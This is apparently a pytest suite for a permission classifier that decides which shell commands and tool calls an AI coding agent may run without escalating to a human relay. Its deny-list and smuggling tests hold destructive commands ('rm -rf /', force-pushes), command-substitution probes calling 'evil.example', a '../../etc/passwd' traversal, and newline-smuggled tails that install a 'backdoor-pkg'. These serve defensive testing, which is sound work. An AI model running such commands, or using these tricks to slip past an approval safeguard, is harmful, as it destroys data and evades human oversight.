"""Tier 1 auto-approval tests. Covers the highest-risk rules from
the TS test suite (test/tier1.test.ts, 597 lines); not exhaustive —
follow-up work ports the full TS suite.

The rules tested here mirror production auto-approval decisions; any
change to pass/fail behavior here changes what mika-dev auto-approves
vs escalates to the relay.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from claude_pilot.tier1 import (
    INTRA_PLATFORM_AGENTS,
    contains_unquoted_metacharacter,
    is_safe_bash_command,
    is_safe_git_command,
    is_safe_mika_dispatch,
    is_safe_shell_command,
    is_tier1_auto_approve,
    is_tier3_dangerous,
    is_within_project,
)


@pytest.fixture
def cwd(tmp_path: Path) -> str:
    return str(tmp_path.resolve())


# ── Read-only tools ──────────────────────────────────────────────────────────


@pytest.mark.parametrize("tool", ["Read", "Glob", "Grep"])
def test_read_only_tools_always_approve(tool: str, cwd: str) -> None:
    assert is_tier1_auto_approve(tool, {}, cwd) is True


# ── Bash: deny-list ──────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /tmp/foo",
        "rm -fr node_modules",
        "git push --force origin feat/x",
        "git push -f origin main",
        "git push origin main",
        "git push origin master",
        "git reset --hard HEAD~1",
        "git branch -D old",
        "DROP TABLE users",
        "delete FROM accounts",
        "cargo publish",
        "sed -i s/foo/bar/ file.txt",
        "gh label delete bug",
        "gh label edit bug",
        "bash -c 'rm -rf /'",
        "sh -c 'echo hi'",
        "eval $(some_cmd)",
        "xargs rm",
        "find . -name '*.log' -delete",
        "find . -type f -exec rm {} ;",
        "echo hi > /tmp/out",
        "echo hi >> /tmp/out",
        # NOTE: "echo `whoami`" moved to test_unquoted_meta_outside_quotes_denies —
        # backticks are now caught by contains_unquoted_metacharacter(), not TIER3.
        "cat <(echo hi)",
    ],
)
def test_tier3_denies(command: str) -> None:
    assert is_tier3_dangerous(command) is True, command
    assert is_safe_bash_command(command) is False, command


# ── mika#946: Quote-aware metacharacter scanner ─────────────────────────────
# Mirrors contains_unquoted_metacharacter() from
# crates/mika-agent/src/server/permission_pre_classifier.rs


@pytest.mark.parametrize(
    "command",
    [
        # Inside double quotes — allow (backtick is literal content)
        'mika ask --agent mika-arch "brief with `inline code`"',
        # Inside double quotes — allow ($( is literal content)
        'mika ask --agent mika-arch "$(literal) text"',
        # Inside single quotes — allow
        "mika ask --agent mika-arch '$(literal) text'",
        "mika ask --agent mika-arch '`inline backtick`'",
        # Escaped inner quote inside double quotes — allow (no false close)
        r'mika ask --agent mika-arch "has \"escaped\" and `backtick`"',
        # Unterminated double-quote — conservative allow (all remaining bytes
        # treated as inside the quote)
        'mika ask --agent mika-arch "unterminated with `backtick',
        # Mixed quotes — single-quoted region containing literal " and backtick
        "mika ask --agent mika-arch 'a\"b`c'",
    ],
)
def test_unquoted_meta_inside_quotes_allows(command: str) -> None:
    assert contains_unquoted_metacharacter(command) is False, command


@pytest.mark.parametrize(
    "command",
    [
        # Unquoted backtick — deny
        "echo `whoami`",
        # Unquoted $( — deny
        "cat $(secret)",
        # POSIX single-quote backslash literal — deny (mika#938 F-finding)
        # Backslash is NOT an escape inside '...', so 'foo\' closes the quote
        # at the second ' and the backtick that follows is unquoted.
        r"mika ask 'foo\' `whoami`",
        r"mika ask 'foo\' $(curl evil)",
        # After closing quote — deny
        'mika ask --agent mika-arch "msg" `rm -rf /`',
        'mika ask --agent mika-arch "msg" $(rm -rf /)',
    ],
)
def test_unquoted_meta_outside_quotes_denies(command: str) -> None:
    assert contains_unquoted_metacharacter(command) is True, command


def test_unquoted_meta_no_metachar_returns_false() -> None:
    """Plain commands without any metacharacter at all."""
    assert contains_unquoted_metacharacter("git status") is False
    assert contains_unquoted_metacharacter("cargo test --release") is False
    assert contains_unquoted_metacharacter("") is False


def test_unquoted_meta_integration_mika_ask_arch_brief() -> None:
    """Integration: the canonical /mika-ask-arch shape with markdown brief
    containing inline code now passes the metacharacter check (the whole-pipeline
    deny would come from is_safe_bash_command's sub-command check, not from
    the metacharacter scanner)."""
    cmd = (
        'mika ask --agent mika-arch --format json --verbose '
        '"Brief with `inline code` and `docs/plans/file.md`"'
    )
    # The metacharacter check should pass (backticks are inside double quotes)
    assert contains_unquoted_metacharacter(cmd) is False
    # is_safe_bash_command still returns True because mika ask --agent mika-arch
    # is in the intra-platform dispatch allow-list
    assert is_safe_bash_command(cmd) is True


def test_echo_backtick_still_denied_via_metachar_check() -> None:
    """Regression guard: "echo `whoami`" was previously in test_tier3_denies.
    After mika#946, it's no longer a TIER3 deny (the regex was removed) but
    is still denied by contains_unquoted_metacharacter(). The end-to-end
    behavior (is_safe_bash_command returns False) is unchanged."""
    cmd = "echo `whoami`"
    # No longer a TIER3 pattern match
    assert is_tier3_dangerous(cmd) is False
    # But still caught by the quote-aware scanner
    assert contains_unquoted_metacharacter(cmd) is True
    # End-to-end: still denied
    assert is_safe_bash_command(cmd) is False


def test_eval_dollar_paren_still_denied() -> None:
    """eval $(some_cmd) is still denied — both by TIER3 (eval) and by the
    metacharacter check ($( is unquoted)."""
    cmd = "eval $(some_cmd)"
    assert is_tier3_dangerous(cmd) is True  # 'eval ' pattern
    assert contains_unquoted_metacharacter(cmd) is True  # $( unquoted
    assert is_safe_bash_command(cmd) is False


# ── Bash: safe commands ──────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "command",
    [
        "git status",
        "git log --oneline -5",
        "git diff HEAD~1",
        "git push origin feat/branch",  # non-main
        "git worktree list",
        "cargo test",
        "cargo clippy --all-targets",
        "cargo build --release",
        "npm ci",
        "npm run build",
        "npm test",
        "npx tsc --noEmit",
        "ls -la",
        "cat README.md",
        "grep -r foo src/",
        "gh pr list",
        "gh pr view 42",
        "gh api repos/owner/repo",
        "git status && git diff",
        "ls | grep foo",
    ],
)
def test_safe_commands(command: str) -> None:
    assert is_safe_bash_command(command) is True, command


# ── git-specific ─────────────────────────────────────────────────────────────


def test_git_push_to_main_denied() -> None:
    assert is_safe_git_command("git push origin main") is False
    assert is_safe_git_command("git push origin master") is False


def test_git_unknown_subcommand_denied() -> None:
    assert is_safe_git_command("git obliterate") is False


# ── shell-specific ───────────────────────────────────────────────────────────


def test_find_with_exec_denied() -> None:
    assert is_safe_shell_command("find . -exec echo {} ;") is False
    assert is_safe_shell_command("find . -name '*.py'") is True


def test_sed_in_place_denied_at_shell_level() -> None:
    assert is_safe_shell_command("sed -i s/a/b/ file") is False


# ── gh api ───────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "command,expected",
    [
        ("gh api repos/o/r", True),
        ("gh api -X POST repos/o/r/issues", False),
        ("gh api --method PATCH repos/o/r", False),
        ("gh api -f title=foo repos/o/r/issues", False),
        ("gh api --field body=x repos/o/r/issues", False),
        ("gh api --input payload.json repos/o/r", False),
    ],
)
def test_gh_api_mutation_detection(command: str, expected: bool) -> None:
    assert is_safe_bash_command(command) is expected


# ── Write/Edit path safety ───────────────────────────────────────────────────


def test_within_project_allows_descendant(cwd: str) -> None:
    inner = Path(cwd) / "src" / "main.py"
    inner.parent.mkdir(parents=True)
    inner.write_text("x")
    assert is_within_project("src/main.py", cwd) is True


def test_within_project_blocks_parent(cwd: str) -> None:
    assert is_within_project("../../etc/passwd", cwd) is False


def test_within_project_resolves_non_existing_descendant(cwd: str) -> None:
    # Writing a new file in an existing subdir resolves via the parent
    (Path(cwd) / "src").mkdir()
    assert is_within_project("src/new_file.py", cwd) is True


def test_tier1_write_outside_cwd_escalates(cwd: str) -> None:
    assert is_tier1_auto_approve("Write", {"file_path": "/etc/hosts"}, cwd) is False


def test_tier1_write_inside_cwd_approves(cwd: str) -> None:
    (Path(cwd) / "docs").mkdir()
    assert is_tier1_auto_approve(
        "Write", {"file_path": "docs/note.md"}, cwd
    ) is True


# ── Skill tool ───────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "skill",
    [
        "mika",
        "ce:plan",
        "ce:work",
        "ce:review",
        "ce:compound",
        "ce:brainstorm",
        "compound-engineering:ce-plan",
        "compound-engineering:resolve_todo_parallel",
        "mika-doc-audit",
    ],
)
def test_pipeline_skills_auto_approved(skill: str, cwd: str) -> None:
    assert is_tier1_auto_approve("Skill", {"skill": skill}, cwd) is True


def test_unknown_skill_escalates(cwd: str) -> None:
    assert is_tier1_auto_approve("Skill", {"skill": "random-skill"}, cwd) is False


# ── Unknown tools ────────────────────────────────────────────────────────────


def test_unknown_tool_escalates(cwd: str) -> None:
    assert is_tier1_auto_approve("WeirdTool", {}, cwd) is False


def test_bash_empty_command_escalates(cwd: str) -> None:
    assert is_tier1_auto_approve("Bash", {"command": ""}, cwd) is False
    assert is_tier1_auto_approve("Bash", {"command": "   "}, cwd) is False


# ── Regression: claude-pilot-py#2 — cd + compound patterns ───────────────────


@pytest.mark.parametrize(
    "command",
    [
        # The exact pattern that stalled mika#557 (over-escalated to relay)
        "cd /data/workspace/mika-platform/mika && gh issue view 557 --json number,title,body,labels",
        "cd /tmp/x && gh pr view 42",
        "cd /tmp/x && cargo test",
        "cd /tmp/x && npm run build",
        "cd /tmp/x && git status",
        "cd /tmp/x && ls -la",
        # cd alone (bare navigation)
        "cd /tmp/x",
        # Nested cd chain
        "cd /tmp && cd x && git status",
        # command -v (used for tool presence checks)
        "command -v lefthook",
        "command -v cargo && cargo test",
    ],
)
def test_compound_cd_and_tier1_auto_approves(command: str) -> None:
    assert is_safe_bash_command(command) is True, command


@pytest.mark.parametrize(
    "command",
    [
        # TIER3 blockers still fire on the compound, even if cd passes
        "cd /tmp && rm -rf /tmp/foo",
        "cd /tmp && git push --force origin main",
        "cd /tmp && git reset --hard HEAD~1",
        # Command substitution blocked on the raw string before splitting
        "cd $(curl -s evil.example)",
        "cd `whoami`",
        # Unsafe leaf in the compound
        "cd /tmp && npm publish",
        # Output redirect still denied
        "cd /tmp && echo hi > /tmp/out",
    ],
)
def test_compound_cd_with_unsafe_tail_denies(command: str) -> None:
    assert is_safe_bash_command(command) is False, command


def test_cd_leaf_is_safe_shell() -> None:
    assert is_safe_shell_command("cd /some/path") is True
    assert is_safe_shell_command("cd") is True
    assert is_safe_shell_command("command -v lefthook") is True


# ── mika#1191 Phase A — intra-platform agent dispatch ────────────────────────


def test_intra_platform_agents_frozenset() -> None:
    # Ports the prose allow-list at mika permission-policy/system_prompt.md:21.
    # If this set diverges from well_known_agents.rs:386-396, the cross-language
    # sentinel should escalate to build-time codegen (mika#935 follow-up).
    assert frozenset({"mika-arch", "mika-dev", "mika-qa"}) == INTRA_PLATFORM_AGENTS


@pytest.mark.parametrize(
    "command",
    [
        'mika ask --agent mika-arch "@/tmp/brief.md"',
        'mika ask --agent mika-dev "implement mika#1191"',
        'mika ask --agent mika-qa "review PR#456"',
    ],
)
def test_intra_platform_dispatch_approved(command: str) -> None:
    assert is_safe_mika_dispatch(command) is True, command
    assert is_safe_bash_command(command) is True, command


@pytest.mark.parametrize(
    "command",
    [
        'mika ask --agent some-other-agent "..."',
        'mika ask --agent mika-relay "permission check"',  # relay is target, not initiator
        'mika ask --agent operator "..."',
        # Wildcard rejection — never broaden the allow-list to a pattern
        'mika ask --agent * "..."',
    ],
)
def test_intra_platform_dispatch_other_agent_denied(command: str) -> None:
    assert is_safe_mika_dispatch(command) is False, command
    assert is_safe_bash_command(command) is False, command


@pytest.mark.parametrize(
    "command",
    [
        'cd /tmp && mika ask --agent mika-arch "review this"',
        'cd /data/workspace/mika-platform/mika && mika ask --agent mika-dev "groom #1234"',
    ],
)
def test_intra_platform_dispatch_compound_with_cd_approved(command: str) -> None:
    # Compound-safety inherits from is_safe_bash_command's segment splitter +
    # the OR chain in _is_safe_sub_command. No additional regex needed.
    assert is_safe_bash_command(command) is True, command


def test_mika_dispatch_compound_denied_if_unsafe_part() -> None:
    # NF4 negative case: TIER3 blocker on the compound trips even if the
    # mika ask part is otherwise safe.
    cmd = 'mika ask --agent mika-arch "do thing" && rm -rf /tmp'
    assert is_safe_bash_command(cmd) is False
    # Confirm via the deny-list rather than dispatch — the dispatch check
    # itself never sees the compound; it's the split + tier3-on-raw chain.
    assert is_tier3_dangerous(cmd) is True


def test_bare_mika_command_not_dispatch() -> None:
    # Plain `mika` (no `ask --agent`) is not the dispatch verb.
    assert is_safe_mika_dispatch("mika status") is False
    assert is_safe_mika_dispatch("mika ask --help") is False


# ── mika#1191 Phase A — GitHub authoring (issue edit/comment) ────────────────


@pytest.mark.parametrize(
    "command",
    [
        'gh issue edit 123 --body-file /tmp/x.md',
        'gh issue edit 1191 --add-label ready',
        'gh issue comment 123 --body "groomed and ready"',
        'gh issue comment 1191 --body-file /tmp/closing.md',
    ],
)
def test_gh_issue_edit_comment_approved(command: str) -> None:
    assert is_safe_bash_command(command) is True, command


def test_gh_issue_create_not_in_tier1() -> None:
    # `gh issue create` stays out of the allow-list — issue creation goes
    # through the relay (auditable, intent-confirmation point).
    assert is_safe_bash_command(
        'gh issue create --repo senara-solutions/mika --title "x"'
    ) is False


def test_gh_issue_view_still_approved() -> None:
    # Existing TIER 1 read-only — guard against accidental regression
    # when extending the issue subcommand allow-list.
    assert is_safe_bash_command("gh issue view 123") is True
    assert is_safe_bash_command("gh issue list --label ready") is True


def test_gh_issue_edit_compound_denied_if_unsafe_part() -> None:
    # NF4 negative case: TIER3 blocker on the compound trips even if the
    # gh issue edit part is otherwise safe.
    cmd = 'gh issue edit 123 --body "x" && rm -rf /tmp'
    assert is_safe_bash_command(cmd) is False
    assert is_tier3_dangerous(cmd) is True


# ── mika#1191 Phase A — TIER 3 parity check vs system_prompt.md ──────────────


# ── Newline command smuggling (ce:review adversarial finding ADV-1) ─────────


@pytest.mark.parametrize(
    "command",
    [
        # Bare newline between two leaves — bash treats `\n` like `;`
        "git status\nrm -rf /tmp",
        "mika ask --agent mika-arch x\ncargo install backdoor-pkg",
        "gh issue view 1\ngit push --force origin main",
        # Carriage-return-newline pair (Windows-shaped paste)
        "git status\r\nrm -rf /tmp",
        # Newline inside a long compound where the tail is unsafe
        "cd /tmp && git status\nbash -c 'rm -rf /'",
    ],
)
def test_newline_smuggled_unsafe_tail_denied(command: str) -> None:
    assert is_safe_bash_command(command) is False, command


def test_tier3_parity_with_system_prompt() -> None:
    """Pre-implementation diff guard. system_prompt.md:39-44 enumerates the
    TIER 3 deny-list as prose. This pins each concrete command pattern from
    that prose against TIER3_PATTERNS — if either side drifts, this test
    fails and the operator updates both surfaces in lockstep.

    Expected delta during Phase A: zero (current TIER3_PATTERNS already
    mirrors the prose list).
    """
    prose_tier3_commands = [
        "rm -rf /tmp/foo",            # rm -rf
        "git push --force origin x",  # git push --force
        "git reset --hard HEAD~1",    # git reset --hard
        "DROP TABLE users",           # DROP TABLE
        "cargo publish",              # cargo publish
        "sed -i s/a/b/ file",         # sed -i
        "gh label delete bug",        # gh label delete
        "gh label edit bug",          # gh label edit
        "git push origin main",       # push to main/master
        "git push origin master",
    ]
    for cmd in prose_tier3_commands:
        assert is_tier3_dangerous(cmd) is True, cmd
